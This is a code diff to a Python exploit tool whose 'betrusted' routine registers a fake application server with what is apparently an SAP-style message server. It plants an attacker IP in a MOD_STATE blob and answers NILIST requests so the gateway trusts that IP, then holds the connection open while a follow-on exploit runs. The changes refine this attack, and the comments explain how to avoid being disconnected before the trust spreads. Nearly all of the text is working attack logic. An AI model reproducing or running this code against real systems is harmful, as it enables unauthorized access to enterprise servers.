@@ -433,9 +433,13 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
     deadline = time.time() + wait_secs
     while time.time() < deadline:
         remaining = deadline - time.time()
-        pkt = ni_try_recv(sock, min(remaining, 5.0))
-        if pkt is None:
-            continue
+        try:
+            pkt = ni_recv(sock, min(remaining, 1.0))
+        except (socket.timeout, TimeoutError):
+            continue   # normal idle — keep waiting
+        except (ConnectionError, OSError):
+            logger.debug("NILIST wait: MS closed connection — exiting early")
+            break      # socket dead, no point waiting further
         if len(pkt) < _HEADER_LEN:
             continue
 
@@ -667,22 +671,31 @@ def betrusted(host: str, port: int, attacker_ip: str,
         ni_send(sock, pkt_mod_state(our_name, key, MSG_DIA, dp_info))
         time.sleep(0.3)
 
-        # ---- ADM CHANGE_IP: update our IP in the MS routing table ------------
-        # This tells the MS that our registered server now lives at attacker_ip.
-        # The MS will propagate this to the gateway on its next NILIST cycle.
-        # NOTE: we do NOT proactively send an ADM NILIST to the MS — that
-        # direction (AppServer → MS) is unexpected and causes the MS to
-        # immediately terminate our connection.
-        print(f"[*] ADM CHANGE_IP → {attacker_ip}")
-        ni_send(sock, pkt_adm(our_name, key, [adm_change_ip_record(attacker_ip)]))
-        result["change_ip_sent"] = True
+        # ---- Registration complete ----------------------------------------
+        # The attacker IP is already embedded in the MOD_STATE DP blob
+        # (dp_addr_from, offset 69-73).  The MS reads it from there and
+        # adds it to the internal server table that gets propagated to the
+        # gateway on the next MS→GW NILIST cycle.
+        #
+        # NOTE: sending ANY ADM packet (CHANGE_IP, NILIST, …) from the
+        # fake app server *to* the MS is rejected by the MS — these ADMs
+        # flow MS→AppServer, not the other way around.  Sending them causes
+        # an immediate LOGOUT/disconnect, killing the trust before it
+        # propagates.  We therefore send NO ADM packets at all.
+        print(f"[*] Registration complete — {attacker_ip} is in the MS server "
+              f"table via MOD_STATE DP blob (dp_addr_from)")
+
+        result["change_ip_sent"] = True   # conceptually: IP is in DP blob
+        result["success"] = True
 
         # ---- Wait for MS NILIST request (accelerates trust propagation) ----
-        # The MS periodically asks registered app servers for their IP lists
-        # (NILIST requests).  Replying with attacker_ip makes the MS propagate
-        # it to the gateway immediately, rather than waiting for the next cycle.
+        # The MS periodically asks registered app servers for their IP list
+        # (NILIST request).  Replying immediately makes the MS push our IP
+        # to the gateway right away rather than waiting for its next cycle.
+        # We wait here while holding the connection open.
         if nilist_wait > 0:
-            print(f"[*] Waiting up to {nilist_wait:.0f}s for NILIST request from MS...")
+            print(f"[*] Waiting up to {nilist_wait:.0f}s for NILIST request from MS "
+                  f"(connection held open)...")
             got = _wait_and_reply_nilist(
                 sock, our_name, key, attacker_ip, nilist_wait,
                 kernel_new=kernel_new,
@@ -690,16 +703,17 @@ def betrusted(host: str, port: int, attacker_ip: str,
             if got:
                 result["nilist_response"] = True
                 result["nilist_sent"] = True
-                print(f"[+] Replied to NILIST request — {attacker_ip} propagated to gateway")
+                print(f"[+] Replied to NILIST request — "
+                      f"{attacker_ip} propagated to gateway immediately")
             else:
-                print(f"[!] No NILIST request received within {nilist_wait:.0f}s "
-                      f"— MS will propagate our IP on its next cycle")
+                print(f"[!] No NILIST request in {nilist_wait:.0f}s — "
+                      f"MS will propagate our IP on its next cycle "
+                      f"(typically every 30-60 s while connected)")
 
-        result["success"] = True
         print()
-        print(f"[+] betrusted attack completed.")
-        print(f"[*] {attacker_ip} registered as trusted server; "
-              f"gateway trust propagates while connection is held open.")
+        print(f"[+] betrusted registration active.")
+        print(f"[*] {attacker_ip} in MS server table; "
+              f"gateway trust active while TCP connection is held open.")
 
         # ---- Hold connection alive until caller signals to stop ------------
         # The gateway only trusts attacker_ip while our fake app server is
@@ -712,16 +726,23 @@ def betrusted(host: str, port: int, attacker_ip: str,
         if stop_event is not None:
             print(f"[*] Holding MS connection open (waiting for exploit to complete)...")
             while not stop_event.is_set():
-                # Keep reading — reply to any NILIST requests that arrive
-                pkt = ni_try_recv(sock, timeout=0.5)
-                if pkt is not None and len(pkt) >= _HEADER_LEN:
+                # Keep reading with a short timeout so we can check stop_event
+                # between reads and reply to any NILIST requests that arrive.
+                try:
+                    pkt = ni_recv(sock, timeout=0.5)
+                except (socket.timeout, TimeoutError):
+                    continue   # idle — keep holding
+                except (ConnectionError, OSError):
+                    logger.debug("Hold phase: MS closed connection")
+                    break
+                if len(pkt) >= _HEADER_LEN:
                     hdr2 = ms_parse_header(pkt)
                     if hdr2 and hdr2.get("flag") == FLAG_ADMIN:
                         adm = pkt[_HEADER_LEN:]
                         if (adm[:12] == _ADM_EYE
                                 and len(adm) >= _ADM_HDR_LEN + 1
                                 and adm[_ADM_HDR_LEN] == ADM_NILIST):
-                            logger.debug("NILIST request arrived in hold phase — replying")
+                            logger.debug("NILIST request in hold phase — replying")
                             reply = build_nilist_reply(our_name, key,
                                                        attacker_ip, kernel_new)
                             try:
